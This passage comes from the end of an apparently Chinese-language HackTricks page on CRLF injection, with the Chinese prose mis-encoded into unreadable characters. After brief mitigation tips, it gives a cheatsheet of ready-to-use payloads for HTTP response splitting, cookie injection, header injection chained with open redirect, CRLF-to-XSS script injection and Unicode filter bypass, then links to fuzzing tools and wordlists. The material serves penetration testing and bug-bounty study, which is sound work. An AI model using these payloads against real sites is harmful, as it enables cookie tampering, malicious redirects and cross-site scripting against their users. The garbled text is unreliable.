<li><strong>ç¼–ç ç‰¹æ®Šå­—ç¬¦</strong>ï¼šå¦‚æœæ— æ³•é¿å…ç›´æ¥ç”¨æˆ·è¾“å…¥ï¼Œè¯·ç¡®ä¿ä½¿ç”¨ä¸“é—¨ç”¨äºç¼–ç ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ CR å’Œ LFï¼‰çš„å‡½æ•°ã€‚è¿™ç§åšæ³•å¯ä»¥é˜²æ­¢ CRLF æ³¨å…¥çš„å¯èƒ½æ€§ã€‚</li>
<li><strong>æ›´æ–°ç¼–ç¨‹è¯­è¨€</strong>ï¼šå®šæœŸå°†æ‚¨åœ¨ Web åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬ã€‚é€‰æ‹©ä¸€ä¸ªæœ¬è´¨ä¸Šä¸å…è®¸åœ¨è®¾ç½® HTTP å¤´çš„å‡½æ•°ä¸­æ³¨å…¥ CR å’Œ LF å­—ç¬¦çš„ç‰ˆæœ¬ã€‚</li>
</ol>
<h3 id="cheatsheet"><a class="header" href="#cheatsheet">CHEATSHEET</a></h3>
<p><a href="https://twitter.com/NinadMishra5/status/1650080604174667777">Cheatsheet from here</a></p>
<pre><code>1. HTTP Response Splitting
â€¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
â€¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
â€¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
â€¢ /google.com/%2F..%0D%0AHeader-Test:test2
â€¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
â€¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
â€¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
â€¢ %E5%98%8A = %0A = \u560a
â€¢ %E5%98%8D = %0D = \u560d
â€¢ %E5%98%BE = %3E = \u563e (&gt;)
â€¢ %E5%98%BC = %3C = \u563c (&lt;)
â€¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
</code></pre>
<h2 id="è‡ªåŠ¨å·¥å…·"><a class="header" href="#è‡ªåŠ¨å·¥å…·">è‡ªåŠ¨å·¥å…·</a></h2>
<ul>
<li><a href="https://github.com/Raghavd3v/CRLFsuite">https://github.com/Raghavd3v/CRLFsuite</a></li>
<li><a href="https://github.com/dwisiswant0/crlfuzz">https://github.com/dwisiswant0/crlfuzz</a></li>
</ul>
<h2 id="æš´åŠ›ç ´è§£æ£€æµ‹åˆ—è¡¨"><a class="header" href="#æš´åŠ›ç ´è§£æ£€æµ‹åˆ—è¡¨">æš´åŠ›ç ´è§£æ£€æµ‹åˆ—è¡¨</a></h2>
<ul>
<li><a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt">https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt</a></li>
</ul>
<h2 id="å‚è€ƒèµ„æ–™"><a class="header" href="#å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</a></h2>
<ul>
<li><a href="https://www.invicti.com/blog/web-security/crlf-http-header/"><strong>https://www.invicti.com/blog/web-security/crlf-http-header/</strong></a></li>
<li><a href="https://www.acunetix.com/websitesecurity/crlf-injection/"><strong>https://www.acunetix.com/websitesecurity/crlf-injection/</strong></a></li>
<li><a href="https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning"><strong>https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning</strong></a></li>
<li><a href="https://www.netsparker.com/blog/web-security/crlf-http-header/"><strong>https://www.netsparker.com/blog/web-security/crlf-http-header/</strong></a></li>
</ul>
<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
<p><strong>æ¼æ´èµé‡‘æç¤º</strong>: <strong>æ³¨å†Œ</strong> <strong>Intigriti</strong>ï¼Œä¸€ä¸ªç”±é»‘å®¢ä¸ºé»‘å®¢åˆ›å»ºçš„é«˜çº§<strong>æ¼æ´èµé‡‘å¹³å°</strong>ï¼ä»Šå¤©å°±åŠ å…¥æˆ‘ä»¬ <a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a>ï¼Œå¼€å§‹èµšå–é«˜è¾¾ <strong>$100,000</strong> çš„èµé‡‘ï¼</p>
<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æ”»å‡»ï¼š <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>ç”µæŠ¥ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨ Twitter ä¸Šå…³æ³¨</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/cors-bypass.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/csrf-cross-site-request-forgery.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/cors-bypass.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/csrf-cross-site-request-forgery.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
